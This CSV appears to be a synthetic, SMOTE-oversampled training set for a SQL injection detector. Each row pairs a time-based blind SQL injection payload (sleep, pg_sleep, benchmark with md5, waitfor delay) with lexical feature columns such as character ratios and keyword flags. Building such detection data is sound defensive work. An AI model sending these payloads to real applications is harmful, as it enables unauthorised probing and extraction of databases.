id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000276,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  # gkkx,nearest_attack_euclidean,R000718,0.0755319189799392,77.27106400474281,20.03872342924897,3.0544488577039868,28.96127657075103,1.0387234292489733,37.232340575493836,10.038723429248973,0.37494703769484966,0.013406097719144736,0.48173482624266256,0.12991203834334303,0.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.038723429248973,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.038723429248972985,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.038723429248973
SMOTE_000277,attack,time,1'  )   and sleep  (  5  )   and   (  'njud'  =  'njud,nearest_attack_euclidean,R000352,0.7995271667862958,56.43832755529378,17.044997523697337,3.062226499325533,20.044997523697337,1.651667492100887,25.74166253949556,9.0,0.35491853149030794,0.029846202022726295,0.45523069696591056,0.16000456952105524,3.6516674921008883,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.348332507899112,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.3483325078991121,0.0,0.0,0.0,1.6516674921008878,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000278,attack,time,1'+  (  select shec where 3589  =  3589 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',nearest_attack_euclidean,R000425,0.11684326315661736,107.84207289405043,29.063170842379826,3.7204448868810824,35.0,18.0,41.87365831524035,12.968414578810087,0.3245709680607906,0.16692221214554945,0.38825854337431137,0.12024827641934858,1.9684145788100875,0.0,0.0631708423798249,0.0,-2.7755575615628914e-17,2.0,0.0,5.968414578810087,0.0,1.0,0.0,4.031585421189913,1.0,0.0,0.03158542118991245,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000279,attack,time,"1"" where 8697  =  8697 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000233,1.0059172963630083,77.25080424955736,26.70846737492623,3.594398925817238,17.77116843731557,18.0,32.12540212477868,9.354233687463115,0.2290543800050151,0.2342442423058771,0.41541180138954437,0.12128957629956341,0.0,1.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,4.354233687463114,0.0,0.0,1.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.6457663125368861,0.3542336874631139,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000280,attack,time,"1   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   8189  =  8189",nearest_attack_euclidean,R000439,0.025158088145534913,108.009581989693,25.0,3.3172281251676377,18.0,29.009581989693004,50.0,11.0,0.1666520153062798,0.2685828217113275,0.46292226473966613,0.10184289824272655,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,8.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.009581989693002,0.9904180103069982,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000281,attack,time,"1""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""fbol"" like ""fbol",nearest_attack_euclidean,R000616,0.6422442909028733,110.96029562725298,29.620036953406622,3.6615748731902347,29.240073906813244,21.810018476703313,46.10018476703311,13.810018476703311,0.26356601830998216,0.1970296815739896,0.41472671619527673,0.1246775839207515,0.0,4.0,0.0,0.0,-2.7755575615628914e-17,1.1899815232966888,0.0,7.620036953406622,0.0,0.0,1.0,1.1899815232966886,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.8100184767033114,0.18998152329668877,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000282,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,0.6018520171360694,101.39950954769634,23.433415075383945,3.200980927539395,36.849877386924085,1.2832924623080286,48.69975477384817,14.566584924616057,0.3637203747867804,0.012464114263310788,0.48022254351534255,0.1435929674345663,0.0,3.283292462308028,0.0,0.0,1.0,1.0,0.0,9.283292462308028,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.2832924623080282,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.283292462308029
SMOTE_000283,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'nlrk' like 'nlrk",nearest_attack_euclidean,R000251,0.7126944342984379,86.24684164278743,26.617275487386756,3.9176880766842657,35.0,15.0,27.320928411707293,8.925913231080134,0.40896454302121943,0.17527051843766547,0.3128392345129982,0.10292570402811684,3.0,0.0,0.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,4.925913231080134,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000284,attack,time,1  )   where 7165  =  7165 and sleep  (  5  )  #,nearest_attack_euclidean,R000721,0.9245206488823292,46.6849929911472,19.0,3.365255917941093,13.876671339235202,10.0,18.246657321529593,4.561664330382399,0.2982293126844334,0.21442132874468892,0.38987948685670215,0.09746987171417554,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,2.5616643303823987,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5616643303823986,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5616643303823987
SMOTE_000285,attack,time,"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000379,0.6710089095504652,78.95087914888188,25.28684063833859,3.290623752530931,19.76228021277953,10.0,37.95087914888188,11.23771978722047,0.2505378789273242,0.1267184503613479,0.48045435351847354,0.1422893171928543,0.0,1.0,2.0,0.0,-2.7755575615628914e-17,1.0,0.0,6.23771978722047,0.0,1.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.76228021277953,0.23771978722047002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000286,attack,time,1  )   where 2734  =  2734 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000199,0.9901945875861735,50.42015340177652,25.0,4.148286429529174,17.0,12.0,13.0,8.420153401776513,0.3371989773214899,0.2380228075210517,0.25785804148113933,0.16692017367631906,2.0,0.4201534017765135,2.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.4201534017765136,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000287,attack,time,"1'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000699,1.2806760520583549,85.46761469388069,25.402844081642087,3.3621420467904484,16.532385306119306,19.93522938776139,38.0,11.0,0.1934751438063159,0.23318875769849318,0.4446279947513726,0.1287081037438184,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,7.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.4676146938806952,0.5323853061193048,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000288,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  'npzh'  =  'npzh,nearest_attack_euclidean,R000740,0.04354601613811749,136.0,27.212548307474755,2.9992237159272475,41.0,2.0,73.0,20.0,0.3014705882352941,0.01470588235294118,0.5367647058823529,0.14705882352941177,4.0,0.0,0.0,0.0,1.0,1.0,0.0,14.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000289,attack,time,1%'   )    )     )   rlike sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000513,0.7997127175434647,69.88074045635736,17.683133881258257,2.522681284699045,12.049401643774775,2.0,41.46507105006607,14.366267762516518,0.17195527153448997,0.028852130945344542,0.5931906685035812,0.20600192901658437,4.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,7.366267762516517,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.31686611874174153,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3168661187417414
SMOTE_000290,attack,time,"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""zvew"" like ""zvew",nearest_attack_euclidean,R000174,0.2177946640576939,110.20243314663762,25.099695856670298,3.3224208988300874,43.1993917133406,2.0,50.20243314663761,14.800608286659402,0.3923229121731294,0.018157538153303995,0.4552738554008796,0.13424569427268693,0.0,4.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,9.800608286659402,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.9003041433297012,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.900304143329701
SMOTE_000291,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000692,0.8194464481325331,89.61390166873686,26.258336818746415,3.6493687042944813,32.67778242499522,10.0,35.51667363749283,11.419445606248805,0.36465447970511655,0.11199276756282248,0.3957914833478645,0.12756126938419646,4.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.5805543937511946,0.0,4.838891212497611,0.0,1.0,0.0,1.5805543937511946,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000292,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R000119,0.4078269657449813,101.40713427451549,26.545141483922478,3.6050507815565003,26.545141483922478,21.0,40.45313667765115,13.408856112941859,0.26238911351310773,0.20834994028830056,0.396958378295854,0.13230256790273776,4.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.8637146290193805,0.0,6.545141483922477,0.0,0.0,1.0,1.8637146290193805,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000293,attack,time,1'  )   where 1645  =  1645 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000307,0.7221600807546587,55.812918328577254,20.906459164288627,3.527284984239624,17.85968874643294,10.0,20.953229582144314,7.0,0.3177916794505942,0.18008680022891907,0.37606076016024337,0.12606076016024334,1.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,0.0,3.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000294,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.7539260752604097,36.63864941344597,16.31932470672298,3.301789865058142,13.0,0.0,13.319324706722984,10.319324706722982,0.3550420742874287,0.0,0.36344535604329664,0.2815125696692746,0.0,0.31932470672298296,2.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,3.0,0.0,5.0,0.0,2.0,0.0,0.3193247067229831,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000295,attack,time,1  )   where 1203  =  1203 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000555,0.18025342063320832,105.79154900242528,28.0,3.3519675774656,34.79154900242527,10.0,49.0,12.0,0.3288461519568391,0.0945287109919945,0.463190683860773,0.11343445319039339,0.0,0.0,0.0,0.0,1.0,1.0,0.0,9.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.10422549878736342,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.104225498787363
SMOTE_000296,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000635,0.8858393677697033,90.62511631345045,20.656279078362612,3.0217784389260176,32.38290700467849,2.0,44.24220930877196,12.0,0.35396262475355134,0.022232115163464183,0.49041256910219944,0.13339269098078507,1.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,9.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000297,attack,time,"1'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000699,0.45302797707016124,85.25117625725146,24.251176257251455,3.3133927051471312,17.0,19.0,38.0,11.251176257251455,0.1994158691691827,0.22287655965967473,0.4457531193193495,0.1319544518517931,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,7.0,0.25117625725145437,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000298,attack,time,"select sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000202,0.46635525934404737,39.57209057372734,16.0,3.096274199061023,14.0,1.0,17.057672458981866,7.5144181147454665,0.35520639122768166,0.025371885087691545,0.4295704777197034,0.1898512459649234,0.0,3.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,2.5144181147454665,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000299,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000079,0.9860857111767194,78.76099621965255,27.76099621965255,3.8413425872951916,26.043984878610203,15.0,27.4780075606949,10.23900378034745,0.3301166518396774,0.19047837447198906,0.3492332851545318,0.13017168853380176,3.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.619501890173725,0.6195018901737248,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000300,attack,time,"1%""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000726,0.9104414597926069,72.4131401970445,26.50789634572323,3.519720501945777,20.0,10.0,31.921036542767723,10.492103654276772,0.27779127364315154,0.13889563682157577,0.43810843150502027,0.14520465803025234,0.0,1.0,2.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.984207308553545,0.5078963457232276,1.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000301,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000635,0.13743315066113143,85.2136216912411,19.0,2.872450392625993,27.0,2.0,44.04024716392094,12.173374527320156,0.31714183861021594,0.02349198804520118,0.51650903048744,0.14285714285714285,1.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,9.173374527320156,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000302,attack,time,select sleep  (  5  )  -- waln,nearest_attack_euclidean,R000294,0.024416511272876123,30.01493419652448,14.029868393048956,3.243155445978172,14.985065803475521,1.014934196524477,10.014934196524479,4.0,0.4992773775875252,0.03379902333248372,0.33365449884998877,0.13326910023000224,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.9850658034755222,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9850658034755222
SMOTE_000303,attack,time,"1"" where 2677  =  2677 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",nearest_attack_euclidean,R000345,0.300732890134134,100.88690401833665,27.773808036673287,3.4559271026941296,32.886904018336644,10.0,45.0,13.0,0.3259712349749398,0.09912187720956768,0.44604844744305455,0.128858440372438,0.0,1.0,2.0,0.0,1.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.8869040183366433,0.11309598166335666,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000304,attack,time,"1""  )   as eefe where 5290  =  5290 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000502,1.0966497826922321,108.16331710617544,28.288944806238227,3.3575656417785398,35.577889612476454,10.0,50.15577922495291,12.429648268746075,0.32902516779360136,0.0931400696586761,0.46245618930398286,0.1153785732437397,0.0,0.5703517312539246,0.0,0.0,1.0,1.0,0.0,8.85929653749215,0.0,0.0,0.0,2.0,0.0,0.5703517312539246,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000305,attack,time,select pg_sleep  (  5  )   and   (  '%'  =  ',nearest_attack_euclidean,R000431,0.6288438529870871,45.82083784094166,17.589581079529175,3.148691855610512,15.589581079529173,1.0,20.23125676141248,9.0,0.34122346626927275,0.02184996016283826,0.44027693210234475,0.19664964146554428,3.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,3.2052094602354133,1.0,0.7947905397645867,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2052094602354133,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2052094602354133
SMOTE_000306,attack,time,1' where 4473  =  4473 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000453,1.214542520371038,108.40332731131402,29.326841154418002,3.474625949055034,37.422803848060006,10.0,47.21140192403,13.769121539224,0.3438630742464402,0.0929383804106605,0.4368059212936025,0.1263926240492968,1.8845607696120008,0.0,0.0,0.0,1.0,1.0,0.0,8.442280384806,0.0,0.0,0.0,2.4422803848060006,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.4422803848060006,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.442280384806001
SMOTE_000307,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000110,0.15639706397371378,85.0571054366765,24.1713163100295,3.3076530568865166,16.9428945633235,19.114210873353,38.0,11.0,0.19920317995335118,0.22470901791219583,0.44676196900222886,0.12932583313222415,0.0,1.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,7.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.057105436676499366,0.9428945633235005,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
